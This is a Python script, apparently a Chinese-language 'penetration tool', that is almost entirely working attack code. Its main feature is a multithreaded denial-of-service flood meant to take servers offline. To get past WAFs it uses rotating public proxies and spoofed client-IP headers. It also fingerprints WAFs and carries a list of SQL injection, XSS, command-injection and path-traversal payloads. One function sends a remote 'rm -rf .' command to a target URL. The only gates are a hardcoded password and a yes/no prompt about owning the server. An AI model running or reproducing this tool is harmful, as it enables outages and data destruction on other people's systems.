# -*- coding: utf-8 -*-
import requests
import time
import random
import urllib.parse
import threading
import socket
from fake_useragent import UserAgent
from urllib.parse import urlparse, urljoin
from colorama import init, Fore, Style

# 初始化colorama
init(autoreset=True)

# ====================== 全局配置 ======================
TIMEOUT = 5
RETRY_TIMES = 3
ua = UserAgent()
requests.packages.urllib3.disable_warnings()

# ====================== 攻击统计 ======================
attack_success = 0
attack_failed = 0
attack_lock = threading.Lock()
stop_attack = threading.Event()

# ====================== 超强随机IP生成 ======================
def generate_random_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

# ====================== 自动代理获取（优化失败率） ======================
def get_proxy():
    try:
        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=5)
        proxies = r.text.strip().split("\n")
        if proxies:
            p = random.choice(proxies)
            return {"http": f"http://{p}", "https": f"http://{p}"}
    except:
        pass
    return None

# ====================== 终极狂暴请求头（防检测拉满） ======================
def get_ultra_headers():
    rip = generate_random_ip()
    rip2 = generate_random_ip()
    rip3 = generate_random_ip()
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            ua.random
        ]),
        "X-Forwarded-For": f"{rip}, {rip2}, {rip3}",
        "X-Real-IP": rip,
        "Client-IP": rip2,
        "CF-Connecting-IP": rip3,
        "Via": f"1.1 {rip3}",
        "Referer": "https://www.google.com/",
        "Origin": "https://www.google.com",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive, close",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

# ====================== WAF 指纹库（完整版） ======================
WAF_FINGERPRINT = {
    "阿里云WAF": ["aliyun","yundun","aliwaf","tengine","waf2.0"],
    "腾讯云WAF": ["qcloud","teyun","tencent-waf"],
    "百度云防护": ["baiduyun","yunjiasu"],
    "华为云WAF": ["huaweicloud","hwcloud"],
    "金山云WAF": ["ksyun","ksc-waf","kingsoft-waf"],
    "长亭SafeLine": ["safeline","chaitin"],
    "安恒明御WAF": ["anheng","365waf","mingyu"],
    "奇安信WAF": ["qianxin","360waf"],
    "深信服WAF": ["sangfor","sangfor-ngaf"],
    "启明星辰": ["venustech","tianqing"],
    "绿盟科技": ["nsfocus","nfocus","nsfocus-waf"],
    "安全狗": ["safedog","safe-dog"],
    "云锁": ["yunsuo"],
    "Cloudflare": ["cloudflare","cf-ray","cf-request"],
    "F5 BIG-IP": ["big-ip","f5"],
    "ModSecurity": ["mod_security","modsecurity"],
    "Nginx": ["nginx"],
    "Apache": ["apache"],
    "IIS": ["iis"],
}

# ====================== 终极穿透绕过策略（狂暴版） ======================
def ultra_bypass(url):
    try:
        headers = get_ultra_headers()
        proxies = get_proxy()
        for i in range(RETRY_TIMES):
            try:
                res = requests.get(
                    url,
                    headers=headers,
                    timeout=TIMEOUT,
                    verify=False,
                    allow_redirects=False,
                    stream=True,
                    proxies=proxies if proxies else None
                )
                if res.status_code not in (403,405,429,406,503):
                    return res
            except:
                continue
    except:
        pass
    return None

def detect_waf(url):
    try:
        proxies = get_proxy()
        res = requests.get(url, headers=get_ultra_headers(), timeout=5, verify=False, proxies=proxies if proxies else None)
        txt = str(res.headers).lower() + res.text.lower()
        for name, rules in WAF_FINGERPRINT.items():
            if any(r in txt for r in rules):
                return name
    except:
        pass
    return "未知防护"

# ====================== 【优化版】拒绝访问攻击 · 穿透拉满 ======================
def deny_access_ultra_worker(target):
    global attack_success, attack_failed
    while not stop_attack.is_set():
        success_flag = False
        try:
            headers = get_ultra_headers()
            proxies = get_proxy()

            # 策略1: POST 方式绕过
            try:
                res = requests.post(
                    target,
                    headers=headers,
                    data={"_": random.randint(1, 999999)},
                    timeout=2,
                    verify=False,
                    allow_redirects=False,
                    proxies=proxies if proxies else None
                )
                if res and res.status_code not in (403,429,405,503,406):
                    with attack_lock: attack_success +=1
                    success_flag = True
                    continue
            except:
                pass

            # 策略2: OPTIONS 探测
            try:
                res = requests.options(
                    target,
                    headers=headers,
                    timeout=2,
                    verify=False,
                    proxies=proxies if proxies else None
                )
                if res and res.status_code not in (403,429,405,503,406):
                    with attack_lock: attack_success +=1
                    success_flag = True
                    continue
            except:
                pass

            # 策略3: 原始 socket 连接占坑
            try:
                parsed = urlparse(target)
                host = parsed.netloc
                port = parsed.port if parsed.port else (80 if parsed.scheme == "http" else 443)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((host, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: keep-alive\r\n\r\n")
                s.close()
                with attack_lock: attack_success +=1
                success_flag = True
            except:
                pass

            if not success_flag:
                with attack_lock: attack_failed +=1
        except:
            with attack_lock: attack_failed +=1

# ====================== 密码锁定 · 超级拒绝访问攻击（狂暴版） ======================
def start_ultra_deny_attack(target):
    global attack_success, attack_failed, stop_attack

    print(Fore.RED + "\n==================================================")
    print(Fore.RED + "     🔴 终极拒绝访问攻击 · 穿透WAF拉满 · 强制下线")
    print(Fore.RED + "     小神渗透工具！")
    print(Fore.RED + "==================================================\n")

    # 密码验证
    pwd = input("输入管理员密码启用狂暴模式：").strip()
    if pwd != "SmallGodOfficial9178":
        print(Fore.RED + "密码错误！无权启动穿透攻击！")
        return

    print(Fore.GREEN + "✅ 密码正确，权限已解锁！")
    confirm = input("确认你拥有该服务器100%合法所有权？(y/n): ").strip().lower()
    if confirm != "y":
        print(Fore.RED + "已取消！")
        return

    print(Fore.CYAN + "\n[+] 正在检测WAF...")
    waf = detect_waf(target)
    print(Fore.GREEN + f"[+] 识别防护：{waf}，已自动匹配穿透策略")

    attack_success = 0
    attack_failed = 0
    stop_attack.clear()

    try:
        thread_num = int(input("输入狂暴线程(推荐300~1000): "))
    except:
        thread_num = 500

    print(Fore.RED + f"\n🚀 启动【终极拒绝访问攻击】→ {target}")
    print(Fore.RED + "⚠️  服务器将快速占满连接 → 强制下线\n")

    for _ in range(thread_num):
        t = threading.Thread(target=deny_access_ultra_worker, args=(target,), daemon=True)
        t.start()

    try:
        while not stop_attack.is_set():
            print(
                Fore.RED + f"[狂暴拒绝攻击] 成功:{attack_success} 失败:{attack_failed}",
                end="\r"
            )
            time.sleep(0.2)
    except KeyboardInterrupt:
        stop_attack.set()
        print(Fore.RED + "\n🛑 攻击已停止！")

# ====================== 原有功能保留 ======================
def get_random_ua():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        ua.random
    ])

def get_domain_ip(url):
    try:
        domain = urlparse(url).netloc
        return socket.gethostbyname(domain)
    except:
        return None

def scan_open_ports(ip):
    ports = [80,443,8080,8443,81,8090,9000]
    open_ports = []
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            if s.connect_ex((ip,p)) == 0:
                open_ports.append(p)
            s.close()
        except:
            continue
    return open_ports if open_ports else [80,443]

def smart_bypass(url,waf_name,payload):
    return ultra_bypass(url)

VULN_PAYLOADS = {
    "SQL注入": ["' OR 1=1-- -", "' UNION SELECT 1,2,3-- -"],
    "XSS": ["<script>alert(1)</script>"],
    "命令注入": [";id;", "|whoami|"],
    "文件包含": ["../../etc/passwd"],
    "敏感文件": ["/.env","/.git/config"]
}

def scan_vuln(url,waf_name):
    print(Fore.CYAN + "\n[=== 漏洞扫描 ===]")
    for name,pls in VULN_PAYLOADS.items():
        print(Fore.MAGENTA + f"\n[{name}]")
        for p in pls:
            if smart_bypass(url,waf_name,p):
                print(Fore.RED + f"[!] 可能存在漏洞: {p}")
                break

def clear_target_files(url):
    print(Fore.RED + "\n⚠️  清空靶场仅自己服务器使用！")
    if input("输入确认清空：") != "确认清空":
        return
    paths = ["?cmd=rm -rf .", "/clear.php", "/delete.php", "/?action=clean"]
    for p in paths:
        try:
            requests.get(urljoin(url,p), headers=get_ultra_headers(), verify=False, timeout=3)
        except:
            continue

def full_stress_worker(target,paths):
    while not stop_attack.is_set():
        try:
            u = urljoin(target, random.choice(paths))
            proxies = get_proxy()
            requests.get(u, headers=get_ultra_headers(), timeout=2, verify=False, proxies=proxies if proxies else None)
            with attack_lock:
                global attack_success
                attack_success +=1
        except:
            with attack_lock:
                global attack_failed
                attack_failed +=1

def start_full_stress_test(target):
    global attack_success,attack_failed,stop_attack
    attack_success=attack_failed=0
    stop_attack.clear()
    ip = get_domain_ip(target)
    if not ip: return
    ports = scan_open_ports(ip)
    paths = ["/","/index.php","/login","/admin","/api"]
    try:
        n = int(input("线程(100~500):"))
    except:
        n=200
    for p in ports:
        base = f"https://{ip}:{p}" if p==443 else f"http://{ip}:{p}"
        for _ in range(n//len(ports)):
            threading.Thread(target=full_stress_worker, args=(base,paths), daemon=True).start()
    try:
        while not stop_attack.is_set():
            print(Fore.GREEN + f"[压力测试] 成功:{attack_success} 失败:{attack_failed}",end="\r")
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_attack.set()

def random_ip_stress_worker(target):
    while not stop_attack.is_set():
        try:
            proxies = get_proxy()
            requests.get(target, headers=get_ultra_headers(), timeout=2, verify=False, proxies=proxies if proxies else None)
            with attack_lock:
                global attack_success
                attack_success +=1
        except:
            with attack_lock:
                global attack_failed
                attack_failed +=1

def start_random_ip_stress(target):
    global attack_success,attack_failed,stop_attack
    attack_success=attack_failed=0
    stop_attack.clear()
    try:
        n=int(input("线程(100~300):"))
    except:
        n=150
    for _ in range(n):
        threading.Thread(target=random_ip_stress_worker, args=(target,), daemon=True).start()
    try:
        while not stop_attack.is_set():
            print(Fore.GREEN + f"[随机IP压力] 成功:{attack_success} 失败:{attack_failed}",end="\r")
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_attack.set()

# ====================== 主菜单 ======================
def main():
    print("="*60)
    print(Fore.RED + "       🔴 小神渗透工具（仅合法自用）")
    print("="*60)
    print(Fore.CYAN + " 1 → WAF检测+绕过+漏洞扫描")
    print(Fore.CYAN + " 2 → 无死角压力测试")
    print(Fore.RED  + " 3 → 🔴 超级拒绝访问攻击（穿透拉满·需密码）")
    print(Fore.RED  + " 4 → 清空靶场文件")
    print(Fore.CYAN + " 5 → 随机IP压力测试")
    print(Fore.CYAN + " 6 → 退出")
    print("="*60)

    c = input("请选择：").strip()
    if c=="1":
        u=input("URL：").strip()
        if not u.startswith("http"):u="https://"+u
        waf=detect_waf(u)
        scan_vuln(u,waf)
    elif c=="2":
        u=input("URL：").strip()
        if not u.startswith("http"):u="https://"+u
        start_full_stress_test(u)
    elif c=="3":
        u=input("URL：").strip()
        if not u.startswith("http"):u="https://"+u
        start_ultra_deny_attack(u)
    elif c=="4":
        u=input("靶场URL：").strip()
        if not u.startswith("http"):u="https://"+u
        clear_target_files(u)
    elif c=="5":
        u=input("URL：").strip()
        if not u.startswith("http"):u="https://"+u
        start_random_ip_stress(u)
    elif c=="6":
        return

if __name__=="__main__":
    main()

